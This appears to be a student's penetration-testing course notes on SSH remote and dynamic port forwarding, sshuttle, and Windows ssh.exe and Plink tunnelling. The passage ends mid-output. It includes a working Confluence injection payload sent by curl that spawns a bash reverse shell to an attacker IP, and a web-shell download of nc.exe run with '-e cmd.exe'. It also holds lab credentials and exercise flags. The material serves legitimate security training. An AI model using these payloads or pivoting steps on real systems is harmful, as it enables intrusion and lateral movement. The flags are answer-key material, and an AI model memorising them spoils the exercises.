tcp      LISTEN    0         10                       *:3389                   *:*        users:(("gnome-remote-de",pid=2790,fd=15))                                              
tcp      LISTEN    0         128                   [::]:22                  [::]:*        users:(("sshd",pid=1578,fd=4)) 
```
- The SSH server is listening on port 22 of all ifaces for both IPv4 and IPv6.

Once we have a reverse shell from CONFLUENCE01, we ensure it is a TTY shell, then create the SSH remote port forward back to our Kali machine.
*In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.*

The SSH remote port forward option is `-R` with a similar syntax to local port forward.  It takes two socket pairs as the arg.  The listening socket is defined first and the forwarding socket is second.
- Listen on port `2345` of our Kali machine.
	- `127.0.0.1:2345`
- Foward all traffic to PostgresSQL port of PGDATABASE01	.
	- `192.168.244.63:5432`
```bash
ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2346:10.4.244.215:5432 operator@192.168.45.182

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.244.63] 34620
bash: cannot set terminal process group (2761): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'  
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$  ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2345:10.4.244.215:5432 operator@192.168.45.182
ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2345:10.4.244.215:5432 operator@192.168.45.182
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.182 (192.168.45.182)' can't be established.
ECDSA key fingerprint is SHA256:k/DKrtnHi0S7KxJvsqrW010Y7dvqFQm7BAW1SazR3eo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
operator@192.168.45.182's password:
```

We can confirm the remote port forward by checking listening port 2345 is open on our Kali lo iface.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ sudo ss -ntplu                                                     
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
udp      UNCONN    0         0                  0.0.0.0:36624            0.0.0.0:*        users:(("openvpn",pid=533211,fd=3))                                                     
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=4017,fd=237))                                                      
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=4017,fd=184))                                                      
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=4064,fd=81))                                                       
tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:(("sshd",pid=534414,fd=3))                                                        
tcp      LISTEN    0         1                127.0.0.1:38184            0.0.0.0:*        users:(("autossh",pid=531863,fd=3))                                                     
tcp      LISTEN    0         511              127.0.0.1:6463             0.0.0.0:*        users:(("Discord",pid=152499,fd=179))                                                   
tcp      LISTEN    0         128              127.0.0.1:2345             0.0.0.0:*        users:(("sshd",pid=534500,fd=7))                                                        
tcp      LISTEN    0         10                       *:3389                   *:*        users:(("gnome-remote-de",pid=2790,fd=15))                                              
tcp      LISTEN    0         128                   [::]:22                  [::]:*        users:(("sshd",pid=534414,fd=4)) 
```

We can now start probing port 2345 on our lo iface of our Kali machine as if we were probing the PostresSQL DB port on PGDATABASE01 directly.  On our Kali machine:
- Use `psql`
 - Pass `127.0.0.1` as host `-h`
	- `2345` as the port `-p`
 - Using the DB creds we found on CONFLUENCE01.
		- `postgres` user `-U`
   - Password `D@t4basePassw0rd!`
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ psql -h 127.0.0.1 -p 2346 -U postgres
Password for user postgres: 
psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   
------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 hr_backup  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
            |          |          |             |             |            |                 | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
            |          |          |             |             |            |                 | postgres=CTc/postgres
(5 rows)
```
- We can now interact with PGDATABASE01 through our remote port forward.

We created an SSH remote port forward to allow us to connect to an internal DB server from our Kali machine, traversing a perimeter firewall, which would otherwise block inbound conns.

###### Exercises

Start VM Group 1 and follow the example from this section. What's the value of the flag found in the hr_backup database payroll table?
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ psql -h 127.0.0.1 -p 2346 -U postgres
Password for user postgres: 
psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
postgres=# \l
postgres=# \l
postgres=# \c hr_backup
psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
You are now connected to database "hr_backup" as user "postgres".
hr_backup=# \l
hr_backup=# \dt
          List of relations
 Schema |  Name   | Type  |  Owner   
--------+---------+-------+----------
 public | payroll | table | postgres
(1 row)

hr_backup=# TABLE payroll;
 id |                 flag                 
----+--------------------------------------
  0 | OS{94fb6b59e80e8e0076fd6281a791b4ab}
(1 row)

hr_backup=#
```

Start VM Group 2. Download the binary at ssh_remote_client from the CONFLUENCE01 web server at http://CONFLUENCE01:8090/exercises/ssh_remote_client. Create an SSH remote port forward on CONFLUENCE01 that allows you to run the binary against port 4444 on PGDATABASE01 from your Kali machine.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rem-port]
└─$ curl http://192.168.244.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.244.63] 56772
bash: cannot set terminal process group (2713): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:4444:10.4.244.215:4444 operator@192.168.45.182
ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:4444:10.4.244.215:4444 operator@192.168.45.182
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.182 (192.168.45.182)' can't be established.
ECDSA key fingerprint is SHA256:k/DKrtnHi0S7KxJvsqrW010Y7dvqFQm7BAW1SazR3eo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
operator@192.168.45.182's password:


┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rem-port]
└─$ ./ssh_remote_client -i 127.0.0.1 -p 4444
Connecting to 127.0.0.1:4444
Flag: "OS{ab87f3d30de64d29a233056732c6073d}"
```


##### SSH Remote Dynamic Port Forwarding

With remote port forwarding we were able to forward packets to a single socket per SSH conn, this is a limiting factor.  As we saw with local port forwards, we can also utilize dynamic port forwarding for remote sessions.

[Remote Dynamic Port Forwarding](https://man.openbsd.org/ssh#R~5)

This creates a dynamic port forward in the remote configuration, with the SOKS proxy port bound to the SSH server, and traffic forwarded from the SSH client.  This allows us to connect to other ports and hosts through the same connections.  We gain the flexibility of dynamic port forwarding and the benefits of the remote configuration.

*Remote dynamic port forwarding has only been available since October 2017's [OpenSSH 7.6](https://www.openssh.com/txt/release-7.6). Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.*

Extending our scenario, we find a Win server, MULTISERVER03 on the DMZ network.  The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP 8090 on CONFLUENCE01 from our Kali machine.  We can SSH out from CONFLUENCE01 to our Kali machine and create a remote dynamic port forward so we can start enumerating MULTISERVER03	from Kali.

The SSH session is initiated from CONFLUENCE01 connecting back to Kali, binding the SOCKS proxy port to our Kali machine on TCP 9998.  Packets sent to that port get pushed through the tunnel and forwarded to anywhere CONFLUENCE01 can route to!

The remote dynamic port forward command is simple, although confusingly uses the `-R` option as remote port forwarding.  The difference is we only pass one socket, the listening socket for the SSH server.  No need to specify IP, it will bind to lo by default.
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -o PubKeyAuthentication=no -N -R 9998 operator@192.168.45.182

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ sudo ss -ntplu
[sudo] password for operator: 
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                               

...
tcp      LISTEN    0         128              127.0.0.1:9998             0.0.0.0:*        users:(("sshd",pid=538678,fd=9))
...
```

Edit our proxychains conf.
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```

Then run Nmap through proxychains.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ proxychains nmap -vvv -sT --top-ports=20 -Pn 192.168.230.64
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:10 PST
Initiating Parallel DNS resolution of 1 host. at 18:10
Completed Parallel DNS resolution of 1 host. at 18:10, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:10
Scanning 192.168.230.64 [20 ports]
...
Completed Connect Scan at 18:12, 106.64s elapsed (20 total ports)
Nmap scan report for 192.168.230.64
Host is up, received user-set (5.3s latency).
Scanned at 2023-11-09 18:10:22 PST for 107s

PORT     STATE  SERVICE       REASON
21/tcp   closed ftp           conn-refused
22/tcp   closed ssh           conn-refused
23/tcp   closed telnet        conn-refused
25/tcp   closed smtp          conn-refused
53/tcp   closed domain        conn-refused
80/tcp   closed http          conn-refused
110/tcp  closed pop3          conn-refused
111/tcp  closed rpcbind       conn-refused
135/tcp  closed msrpc         conn-refused
139/tcp  closed netbios-ssn   conn-refused
143/tcp  closed imap          conn-refused
443/tcp  closed https         conn-refused
445/tcp  closed microsoft-ds  conn-refused
993/tcp  closed imaps         conn-refused
995/tcp  closed pop3s         conn-refused
1723/tcp closed pptp          conn-refused
3306/tcp closed mysql         conn-refused
3389/tcp closed ms-wbt-server conn-refused
5900/tcp closed vnc           conn-refused
8080/tcp closed http-proxy    conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 106.73 seconds
```
- We receive our results and find that ports 80, 135, and 3389 are open.
*Scanning is a little slower against this Windows host - likely due to the different way the Windows firewall responds when a port is closed compared to Linux.*

###### Exercises

Follow the steps in this section to set up a remote dynamic port forward from CONFLUENCE01. Scan ports 9000-9100 on MULTISERVER03 through it. Which port is open? (Note: Make sure to scan MULTISERVER03 on its internal interface at 10.4.X.64).
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -o PubKeyAuthentication=no -N -R 9996 operator@192.168.45.182


```

Capstone Exercise: Download the ssh_remote_dynamic_client binary from the CONFLUENCE01 web server at http://CONFLUENCE01:8090/exercises/ssh_remote_dynamic_client. Run it against the port you just found on MULTISERVER03 through the remote dynamic port forward.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rdyn-port]
└─$ curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4445%200%3E%261%27%29.start%28%29%22%29%7D/



┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.210.63] 60342
bash: cannot set terminal process group (2664): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh -o PubKeyAuthentication=no -N -R 9996 operator@192.168.45.182
ssh -o PubKeyAuthentication=no -N -R 9996 operator@192.168.45.182
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.182 (192.168.45.182)' can't be established.
ECDSA key fingerprint is SHA256:k/DKrtnHi0S7KxJvsqrW010Y7dvqFQm7BAW1SazR3eo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
operator@192.168.45.182's password:



┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ sudo proxychains nmap -vvv -sT -p 9000-9100 -Pn 10.4.210.64
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 07:35 PST
Initiating Parallel DNS resolution of 1 host. at 07:35
Completed Parallel DNS resolution of 1 host. at 07:35, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:35
Scanning 10.4.210.64 [101 ports]

9062/tcp open   unknown         syn-ack
9063/tcp closed unknown         conn-refused
9064/tcp closed unknown         conn-refused
9065/tcp closed unknown         conn-refused
9066/tcp closed unknown         conn-refused
9067/tcp closed unknown         conn-refused
9068/tcp closed unknown         conn-refused
9069/tcp closed unknown         conn-refused
9070/tcp closed unknown         conn-refused
9071/tcp closed unknown         conn-refused
9072/tcp closed unknown         conn-refused
9073/tcp closed unknown         conn-refused
9074/tcp closed unknown         conn-refused
9075/tcp closed unknown         conn-refused
9076/tcp closed unknown         conn-refused
9077/tcp closed unknown         conn-refused
9078/tcp closed unknown         conn-refused
9079/tcp closed unknown         conn-refused
9080/tcp closed glrpc           conn-refused
9081/tcp closed cisco-aqos      conn-refused
9082/tcp closed unknown         conn-refused
9083/tcp closed emc-pp-mgmtsvc  conn-refused
9084/tcp closed aurora          conn-refused
9085/tcp closed ibm-rsyscon     conn-refused
9086/tcp closed net2display     conn-refused
9087/tcp closed classic         conn-refused
9088/tcp closed sqlexec         conn-refused
9089/tcp closed sqlexec-ssl     conn-refused
9090/tcp closed zeus-admin      conn-refused
9091/tcp closed xmltec-xmlmail  conn-refused
9092/tcp closed XmlIpcRegSvc    conn-refused
9093/tcp closed copycat         conn-refused
9094/tcp closed unknown         conn-refused
9095/tcp closed unknown         conn-refused
9096/tcp closed unknown         conn-refused
9097/tcp closed unknown         conn-refused
9098/tcp closed unknown         conn-refused
9099/tcp closed unknown         conn-refused
9100/tcp closed jetdirect       conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 535.89 seconds
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rdyn-port]
└─$ proxychains ./ssh_remote_dynamic_client -p 9062 -i 10.4.210.64
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Connecting to 10.4.210.64:9062
[proxychains] Strict chain  ...  127.0.0.1:9996  ...  10.4.210.64:9062  ...  OK
Flag: "OS{c161099ec8984d0c43731bfecdf1aa89}"
```


##### Using sshuttle

When we have direct access to an SSH server with a complex internal network behind it, classic dynamic port forwards may be difficult to manage.  [sshuttle](https://github.com/sshuttle/sshuttle) turns SSH conns into a VPN like local routing system, forcing traffic through the SSH tunnel.  It does require root privs on the SSH client and Python3 on the SSH server, not the most lightweight option, but useful in the right scenario.

In our lab, we have SSH access to PGDATABASE01 which we can access through a port forward set up on CONFLUENCE01.  Let's observe the capabilities of shuttle.

First, we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN iface and forwarding to port 22 on PGDATABASE01.
```bash
curl http://192.168.200.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4445%200%3E%261%27%29.start%28%29%22%29%7D/

python3 -c 'import pty; pty.spawn("/bin/sh")'

socat TCP-LISTEN:2222,fork TCP:10.4.200.215:22

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.200.63] 55138
bash: cannot set terminal process group (2198): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ socat TCP-LISTEN:2222,fork TCP:10.4.200.215:22
socat TCP-LISTEN:2222,fork TCP:10.4.200.215:22
```

Now we can run `sshuttle`, by specifying our SSH con string and the subnets that we want to tunnel through this conn, `10.4.50.0/24` and `172.16.50.0/24`
```
sshuttle -r database_admin@192.168.200.63:2222 10.4.200.0/24 172.16.200.0/24
# Added host to ~/.ssh/config as "pgdb"

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ sshuttle -v -r pgdb 10.4.200.0/24 172.16.200.0/24
```

sshuttle doesn't generate much output, but it should be routing our traffic so that requests made to hosts in the subnets we specified will be pushed transparently through the SSH conn.  Let's try to conn to the SMB share on HRSHARES in a new terminal.
```
smbclient -L //172.16.200.217/ -U hr_admin --password=Welcome1234

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rdyn-port]
└─$ smbclient -L //172.16.200.217/ -U hr_admin --password=Welcome1234

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.200.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- We're now connecting to HRSHARES as if we are on the same network.

We used sshuttle to create a VPN-like env.  This allowed us to transparently conn to HRSHARES from our Kali machine as if were on the same network as PGDATABASE01.

#### 18.4 Port Forwarding with Windows Tools
 
- Use ssh.exe and Plink to create port forwards on Windows.
- Understand port forwarding with Netsh.

##### ssh.exe

Since version 1803, OpenSSH client has been bundled with Win by default, it has been available as a Feature-on-demand since 1709.  On versions of Win with SSH installed scp.exe, sftp.exe, ssh.exe along with other `ssh-*` utils in `%systemdrive%\Windows\System32\OpenSSH` locations by default.

We can connect to any SSH server we want, as long as we have creds.  Let's practice by creating a remote dynamic port forward from MULTISERVER03 (Win) to our Kali machine.  In this scenario, only the RDP port 3389 is open on MULTISERVER03, we can RDP in, but we can't bind any other ports to the WAN iface.

Use the RDP creds we found earlier to RDP into the server, then use `ssh.exe` to create a remote dynamic port forward conn back to our Kali machine.  We can then use that to interact with Postgres DB on PGDATABASE01.

Make sure the SSH server is running on our Kali machine.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: disabled)
     Active: active (running) since Thu 2023-11-09 07:22:59 PST; 2 days ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 534413 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 534414 (sshd)
      Tasks: 1 (limit: 38054)
     Memory: 1.5M
        CPU: 1.121s
     CGroup: /system.slice/ssh.service
             └─534414 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
```

Use `xfreerdp` to conn to the RDP server on MULTISERVER03.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:$VM1
```

Once connected, open `cmd.exe` and determine whether SSH is available using `where ssh`.
```powershell
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```
- SSH is on the machine, the version is >7.6 so we can use it for dynamic port forwards.

We can now create the remote dynamic port forward to our Kali machine.
```bash
ssh -N -R 9998 operator@192.168.45.182
```

We can check the SOCKS proxy port is open on our Kali machine with `ss`.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ sudo ss -ntplu                             
[sudo] password for operator: 
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                 
...
tcp      LISTEN    0         128              127.0.0.1:9998             0.0.0.0:*        users:(("sshd",pid=563619,fd=9)) 
...
```

Update `/etc/proxychains.conf` to use this socket.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ tail /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050

# pcore-helios
#socks5		127.0.0.1 6667

socks5		127.0.0.1 9998
```

We can now run `psql` through `proxychains` to connect to PostgresSQL DB as the `postgres` user, pass `D@t4basePassw0rd!`.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ proxychains psql -h 10.4.200.215 -U postgres
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.200.215:5432  ...  OK
Password for user postgres: 
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.200.215:5432  ...  OK
psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   
------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
            |          |          |             |             |            |                 | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
            |          |          |             |             |            |                 | postgres=CTc/postgres
(4 rows)
```

The conn succeeded and we are interacting with the PostgresSQL DB on PGDATABASE01 through our Win dynamic port forward.


###### Exercises

Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database (rdp_admin:P@ssw0rd!). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-ssh]
└─$ ./ssh_exe_exercise_client.bin -h    
prat_server 0.1.0

USAGE:
    ssh_exe_exercise_client.bin [OPTIONS]

OPTIONS:
    -h, --help                 Print help information
    -i, --ip-addr <IP_ADDR>    [default: 127.0.0.1]
    -p, --port <PORT>          [default: 4141]
    -V, --version              Print version information
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-ssh]
└─$ proxychains ./ssh_exe_exercise_client.bin -i $VM2 -p 4141
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Connecting to 10.4.200.215:4141
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.200.215:4141  ...  OK
Flag: "OS{df5841900d6a2c518926f1791a820b27}"
```


##### Plink

Admins may avoid leaving OpenSSH on their Win machines, there is no guarantee it will be present.  Even if we find a recent version of Win, the network admin may have removed it.

Network admins still need remote admin tools, Most networks have SSH servers somewhere, admins need tools to conn, so prior to OpenSSH being available the admins tool of choice was often PuTTY and its CLI variant [Plink](https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html).

A benefit to using popular network admin tools is they will rarely be flagged by traditional AV software.  This makes their usage relatively covert.

We will use Plink in this section as it is more common for us to have a shell instead of a GUI during an assessment.  The Plink manual explains that most of the functions we find with OpenSSH are available, however it lacks remote dynamic port forwarding.

*Many 3rd-party SSH clients for Windows provide port forwarding features. We're using Plink in this case because it's common, lightweight, and specifically designed to run on the command line.*

We will familiarize ourselves with Plink, in this scenario we find MULTISERVER03 now has a web app on TCP port 80 with all other inbound ports blocked by a firewall.  RDP is no longer available.

We can compromise MULTISERVER03 through the web app, drop a web shell, and gain a reverse shell.  We have RDP creds, but cannot connect directly, OpenSSH has been removed, so we cannot create a remote port forward with it.  We can create a remote port forward using Plink.

- We gain an interactive rev shell from MULTISERVER03.
 - We uploaded a basic web shell at `/umbraco/forms.aspx`
  - We can browse to this URL and run any Win command we want.
   - In the context of `iis apppool\defaultapppool` user.
 - We use the web shell to dl `nc.exe`
  - Use to send a rev shell back to Kali.
*MULTISERVER03 is already "pre-compromised" in the lab. At this point, you can browse to /umbraco/forms.aspx on the HTTP server on port 80 on MULTISERVER03. You should see a webshell page, which will let you run arbitrary commands on MULTISERVER03.*
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe


┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ python3 -m http.server 80                                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


powershell wget -Uri http://192.168.45.182/nc.exe -OutFile C:\Windows\Temp\nc.exe

C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.182 4446

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ nc -nvlp 4446
listening on [any] 4446 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.234.64] 53929
Microsoft Windows [Version 10.0.20348.1487]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Next we want to get Plink on to MULTISERVER03.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ sudo cp /usr/share/windows-resources/binaries/plink.exe ./


c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.182/plink.exe -Outfile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.45.182/plink.exe -Outfile C:\Windows\Temp\plink.exe

c:\windows\system32\inetsrv>
```
- With the Plink bin downloading we can now consider it's use.

In this case we will use Plink to setup a remote port forward so we can access the MULTISERVER03 RDP port from our Kali machine.  The syntax is similar to OpenSSH client remote port forward.
- Option `-R` .
 - Pass the socket we want to open on the Kali SSH server.
 - RDP server port on the lo iface of MULTISERVER03 that we will forward packets to.
- Username `-l`
- Password `-pw`
*This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.*
- Limited Kali SSH user `admin`
 - Passwd `faesh0Baeb8oocaV1aoV` .
```powershell
C:\Windows\Temp\plink.exe -ssh -l admin -pw faesh0Baeb8oocaV1aoV -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.182
C:\Windows\Temp\plink.exe -ssh -l admin -pw faesh0Baeb8oocaV1aoV -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.182
The host key is not cached for this server:
  192.168.45.182 (port 22)
You have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
  ssh-ed25519 255 SHA256:puMx/kGvh1yFMewik0L8GNDyOzDYn0n0VZCLqLlkOww
If you trust this host, enter "y" to add the key to Plink's
cache and carry on connecting.
If you want to carry on connecting just once, without adding
